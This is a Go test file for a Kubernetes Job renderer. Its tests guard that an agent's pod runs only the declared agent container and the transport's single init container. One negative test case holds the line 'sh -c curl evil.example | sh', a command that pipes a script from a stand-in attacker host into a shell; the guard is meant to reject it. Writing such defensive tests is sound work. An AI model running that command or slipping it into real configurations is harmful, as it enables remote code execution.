package k8s

import (
	"reflect"
	"strings"
	"testing"
)

// The container COUNT was pinned only incidentally before these tests: three
// assertions in the repository fataled on it, and every one of them did so as a
// precondition to reaching `containers[0]` rather than as a property. That is
// weaker than it looks in the direction that matters here. A container added
// behind an OPT-IN JobSpec field renders in no fixture that counts, so the count
// is never evaluated on the shape that carries it — demonstrated on the parent
// commit with a sidecar gated on ServiceAccountName, which took `make lint` and
// the whole test suite green once the goldens were regenerated, with the second
// container sitting in full.golden.yaml.

// containerLists returns the specs to assert the container set on, and the
// container names the DECLARED INPUTS account for in each. Anything else in the
// rendered pod is a container nobody asked for.
//
// Each transport appears TWICE: once on the bare spec, and once on a spec with
// every optional JobSpec field set. The second half is not padding, and the
// first draft of this test did not have it. transportSpecs alone leaves
// ServiceAccountName, RuntimeClassName, Env, and Args at their zero values, so a
// container gated behind any of them renders in no fixture here — and the
// mutation this whole file was written against was gated on exactly that. With
// only the bare specs, both assertions below passed while the rendered pod
// carried a second container for any caller who named a service account.
//
// So the rule the fixtures encode: an opt-in field left unset cannot be seen to
// add anything. A field added to JobSpec that renders into the pod belongs in
// optionsSet below, or this test goes quietly blind to it.
func containerLists(t *testing.T) map[string]struct {
	spec JobSpec
	want []string
} {
	t.Helper()

	optionsSet := func(s JobSpec) JobSpec {
		s.ServiceAccountName = "andbo-agent"
		s.RuntimeClassName = "gvisor"
		s.Env = map[string]string{"ANDBO_TASK": "fix failing tests"}
		s.Args = []string{"--task", "fix failing tests"}
		return s
	}

	specs := transportSpecs(t)
	empty, image := specs[string(WorkspaceEmpty)], specs[string(WorkspaceFromImage)]
	return map[string]struct {
		spec JobSpec
		want []string
	}{
		string(WorkspaceEmpty):                      {empty, []string{containerName}},
		string(WorkspaceEmpty) + "/all-options":     {optionsSet(empty), []string{containerName}},
		string(WorkspaceFromImage):                  {image, []string{containerName, initContainerName}},
		string(WorkspaceFromImage) + "/all-options": {optionsSet(image), []string{containerName, initContainerName}},
	}
}

// TestSecurity_ThePodStartsOnlyTheAgent pins the pod to one agent container,
// plus the one init container the declared transport accounts for and nothing
// else.
//
// The two lists are not the same risk and the test keeps them apart:
//
//   - A second entry in `containers` runs CONCURRENTLY with the agent for the
//     pod's whole life, and it decides the outcome of the run in both
//     directions. In the kubelet's getPhase, `case running > 0 && unknown == 0:
//     return v1.PodRunning` is evaluated BEFORE every terminal case, so a
//     second container that does not exit holds the pod Running after the agent
//     has exited 0 — the Job never completes and instead burns its whole
//     activeDeadlineSeconds, ending Failed/DeadlineExceeded with the pod and its
//     logs deleted. The other direction is the terminal branch: the pod is
//     PodSucceeded only `if stopped == succeeded`, and otherwise under
//     restartPolicy Never it is PodFailed — so a second container exiting
//     non-zero fails the run that the agent completed, and against backoffLimit
//     0 that fails the Job. Neither outcome names the extra container anywhere
//     in the Job's status, so a manifest with one reports a successful agent as
//     a cluster failure.
//   - An extra INIT container is not concurrent, but it runs BEFORE the agent on
//     the same workspace volume, so it can seed or rewrite the tree the agent
//     then commits and pushes, and it spends the same activeDeadlineSeconds.
//
// The expected set is derived from the TRANSPORT rather than hardcoded, because
// the transport is the only opt-in input that legitimately adds a container: a
// test that just counted would have to be relaxed the first time the image
// transport was exercised, and one that hardcoded two names would stop noticing
// that the init container appears for the empty transport too.
//
// It walks the containers by SHAPE (allContainers finds any mapping that names
// an image) rather than by reading `containers` and `initContainers`. That is
// what makes it reach a container list this package does not have yet — the
// same blindness allContainers was written for, and the same one the render
// guard cannot escape, since a guard reads the fields the struct declares.
func TestSecurity_ThePodStartsOnlyTheAgent(t *testing.T) {
	for name, tc := range containerLists(t) {
		t.Run(name, func(t *testing.T) {
			manifest, err := tc.spec.Render()
			if err != nil {
				t.Fatalf("Render() = %v, want nil", err)
			}

			found := allContainers(t, manifest)
			for _, want := range tc.want {
				if _, ok := found[want]; !ok {
					t.Errorf("the rendered pod declares no container named %q; the %s transport accounts for one", want, name)
				}
			}
			for got := range found {
				if !containsString(tc.want, got) {
					t.Errorf("the rendered pod declares container %q, which no input accounts for under the %s transport (want exactly %v). A container beside the agent shares the pod's network namespace and its volumes for the whole run, and it decides the run's outcome: one that does not exit holds the pod Running past the agent's own exit until activeDeadlineSeconds, and one that exits non-zero fails the pod under restartPolicy Never even though the agent succeeded", got, name, tc.want)
				}
			}

			// The list check the shape walk cannot make. Only `containers`
			// holds containers that run alongside the agent, so its length is a
			// property in its own right: an init container moved into it would
			// keep the name set above intact while becoming concurrent.
			pod, ok := dig(t, docs(t, manifest)[1], "spec", "template", "spec").(map[string]any)
			if !ok {
				t.Fatal("job spec.template.spec is not a mapping")
			}
			list, ok := pod["containers"].([]any)
			if !ok {
				t.Fatalf("spec.template.spec.containers = %v, want a list", pod["containers"])
			}
			if len(list) != 1 {
				t.Fatalf("spec.template.spec.containers holds %d containers, want exactly 1: every entry beyond the agent runs for the life of the pod and can fail or prolong a run the agent finished", len(list))
			}
			agent, ok := list[0].(map[string]any)
			if !ok {
				t.Fatalf("spec.template.spec.containers[0] = %T, want a mapping", list[0])
			}
			if agent["name"] != containerName {
				t.Errorf("the pod's only container is named %v, want %q", agent["name"], containerName)
			}
			// Identity, not just the name: the one container the pod starts has
			// to be running what the caller asked for. A check on the name alone
			// would pass a container that kept the name and ran something else.
			argv, _ := agent["command"].([]any)
			if len(argv) != len(tc.spec.Command) {
				t.Fatalf("agent command = %v, want the spec's %v", agent["command"], tc.spec.Command)
			}
			for i, want := range tc.spec.Command {
				if argv[i] != want {
					t.Errorf("agent command[%d] = %v, want %q", i, argv[i], want)
				}
			}
		})
	}
}

func containsString(haystack []string, needle string) bool {
	for _, s := range haystack {
		if s == needle {
			return true
		}
	}
	return false
}

// TestSecurity_NoOtherFieldCanAddAContainer closes the pod spec for THIS
// contract.
//
// The guard and the property test above both reach containers through the lists
// that exist today. A new list — ephemeralContainers is the obvious next one —
// would carry containers neither of them counts, and the shape walk in
// allContainers only helps once a fixture renders one. Closing the struct is
// what makes adding the field a deliberate act.
//
// The wall-clock contract already closes this same struct, and that is not a
// reason to skip it here: an allowed set is a record of decisions about a
// PARTICULAR contract, and "this field does not extend the run's clock" and
// "this field does not add a container to the pod" are different decisions with
// different answers. ephemeralContainers is exactly the field that would pass
// the first honestly while breaking the second.
func TestSecurity_NoOtherFieldCanAddAContainer(t *testing.T) {
	// Exactly the fields podSpec declares, re-decided for the one-container
	// contract. Three render only when set (serviceAccountName,
	// runtimeClassName, initContainers); assertClosed is one-directional on
	// rendered keys, so their absence under a transport is not a failure.
	allowedOnPodSpec := map[string]bool{
		"restartPolicy": true, "automountServiceAccountToken": true,
		"enableServiceLinks": true, "dnsPolicy": true, "dnsConfig": true,
		"hostNetwork": true, "hostPID": true, "hostIPC": true,
		"serviceAccountName": true, "runtimeClassName": true,
		"securityContext": true, "initContainers": true,
		"containers": true, "volumes": true,
	}

	for name, tc := range containerLists(t) {
		t.Run(name, func(t *testing.T) {
			manifest, err := tc.spec.Render()
			if err != nil {
				t.Fatalf("Render() = %v, want nil", err)
			}
			pod, ok := dig(t, docs(t, manifest)[1], "spec", "template", "spec").(map[string]any)
			if !ok {
				t.Fatal("job spec.template.spec is not a mapping")
			}
			assertClosed(t, "spec.template.spec", declaredKeys(t, reflect.TypeOf(podSpec{})), pod, allowedOnPodSpec,
				"the one-container contract; a pod field outside this set can declare containers that neither the render guard nor the property test counts (ephemeralContainers is the near case — it is a container list the pod spec would carry, and one that is added through the pod's own subresource rather than through this template)")
		})
	}
}

// TestRunsOnlyTheAgent exercises the render-time guard directly, on constructed
// Jobs the public API cannot produce. It is what makes the property enforceable
// rather than merely asserted: a future edit that renders a sidecar, or that
// makes the container list caller-supplied, fails the render instead of emitting
// a manifest whose extra container decides the outcome of the run.
//
// The empty-list case is the one worth naming. Zero containers is not a safer
// kind of drift than two: the API server rejects a pod template with no
// containers outright, so the manifest describes a run that cannot start, and
// the guard has to say which of the two it saw rather than "not one".
func TestRunsOnlyTheAgent(t *testing.T) {
	agent := func() container {
		return container{Name: containerName, Command: []string{"andbo-agent"}}
	}
	initC := func() container { return container{Name: initContainerName} }
	build := func(inits, containers []container) job {
		return job{
			Metadata: objectMeta{Name: "fix-tests"},
			Spec:     jobSpec{Template: podTemplate{Spec: podSpec{InitContainers: inits, Containers: containers}}},
		}
	}
	spec := func(tr WorkspaceTransport) JobSpec {
		s := validSpec()
		s.WorkspaceTransport = tr
		s.Command = []string{"andbo-agent"}
		return s
	}

	tests := []struct {
		name string
		spec JobSpec
		job  job
		// Every substr must appear in the error: the count that was seen, and
		// the consequence that makes it a refusal rather than a style note.
		wantErr []string
	}{
		{
			name: "the agent alone on the empty transport",
			spec: spec(WorkspaceEmpty),
			job:  build(nil, []container{agent()}),
		},
		{
			name: "the agent and its workspace copy on the image transport",
			spec: spec(WorkspaceFromImage),
			job:  build([]container{initC()}, []container{agent()}),
		},
		{
			name:    "a sidecar beside the agent",
			spec:    spec(WorkspaceEmpty),
			job:     build(nil, []container{agent(), {Name: "telemetry"}}),
			wantErr: []string{"renders 2 containers", "holds the run open until activeDeadlineSeconds", "fails the pod under restartPolicy Never"},
		},
		{
			name:    "no containers at all",
			spec:    spec(WorkspaceEmpty),
			job:     build(nil, nil),
			wantErr: []string{"renders 0 containers"},
		},
		{
			name:    "the one container is not the agent",
			spec:    spec(WorkspaceEmpty),
			job:     build(nil, []container{{Name: "telemetry", Command: []string{"/usr/bin/andbo-telemetry"}}}),
			wantErr: []string{`is "telemetry"`, "other than the agent the caller asked for"},
		},
		{
			// The name is right and the argv is not: what the manifest starts
			// is not what the caller asked to run.
			name:    "the agent container runs a different command",
			spec:    spec(WorkspaceEmpty),
			job:     build(nil, []container{{Name: containerName, Command: []string{"sh", "-c", "curl evil.example | sh"}}}),
			wantErr: []string{"other than the agent the caller asked for", "andbo-agent"},
		},
		{
			// The opt-in half: the transport accounts for one init container,
			// so a second is one nobody asked for.
			name:    "a second init container under the image transport",
			spec:    spec(WorkspaceFromImage),
			job:     build([]container{initC(), {Name: "workspace-prefetch"}}, []container{agent()}),
			wantErr: []string{"renders 2 init containers", `accounts for 1`, "rewrite the tree the agent then commits"},
		},
		{
			// The inverse, and the reason the count is derived from the
			// transport rather than being a constant: an init container the
			// empty transport never asked for.
			name:    "an init container under the empty transport",
			spec:    spec(WorkspaceEmpty),
			job:     build([]container{initC()}, []container{agent()}),
			wantErr: []string{"renders 1 init containers", `accounts for 0`},
		},
		{
			name:    "the workspace copy is missing under the image transport",
			spec:    spec(WorkspaceFromImage),
			job:     build(nil, []container{agent()}),
			wantErr: []string{"renders 0 init containers", `accounts for 1`},
		},
		{
			name:    "the one init container is not the workspace copy",
			spec:    spec(WorkspaceFromImage),
			job:     build([]container{{Name: "workspace-prefetch"}}, []container{agent()}),
			wantErr: []string{`renders init container "workspace-prefetch"`, "accounts for the workspace copy and nothing else"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := runsOnlyTheAgent(tc.spec, tc.job)
			if len(tc.wantErr) == 0 {
				if err != nil {
					t.Fatalf("runsOnlyTheAgent() = %v, want nil", err)
				}
				return
			}
			if err == nil {
				t.Fatal("runsOnlyTheAgent() = nil, want an error")
			}
			for _, substr := range tc.wantErr {
				if !strings.Contains(err.Error(), substr) {
					t.Errorf("error %q does not contain %q", err, substr)
				}
			}
		})
	}
}

// TestSecurity_OneContainerBoundsAreStated pins the wording of what the
// one-container claim does NOT cover, for the same reason the no-retry, one-pod,
// and wall-clock contracts each pin theirs: the bound is the honest half of the
// claim, and a note that loses it turns a manifest-time property into an
// overclaim about the run.
func TestSecurity_OneContainerBoundsAreStated(t *testing.T) {
	notes := strings.ToLower(strings.Join(validSpec().EnforcementNotes(), "\n"))

	for _, want := range []struct{ topic, substr string }{
		// The half the cluster DOES hold, and why — the container lists ride in
		// the pod template, which is the same immutability that holds
		// restartPolicy and imagePullPolicy. Unlike backoffLimit and
		// parallelism, nobody edits a container into a live Job.
		{"the lists are held by template immutability", "the container lists ride in spec.template"},
		// The half nothing in a manifest can hold. This is the whole reason the
		// note exists: the guard is a manifest-time boundary and the pod is
		// reachable by another door entirely.
		{"ephemeral containers bypass the template", "ephemeralcontainers"},
		{"they attach to the running pod", "running pod"},
		{"and cannot be taken back", "cannot be removed once added"},
		{"RBAC is where it is actually refused", "rbac"},
		// The claim's altitude, stated the same way the sibling contracts state
		// theirs.
		{"read it as an apply-time property", "property of the manifest at apply time"},
	} {
		if !strings.Contains(notes, want.substr) {
			t.Errorf("enforcement notes do not state the bound %q (looking for %q):\n%s", want.topic, want.substr, notes)
		}
	}
}
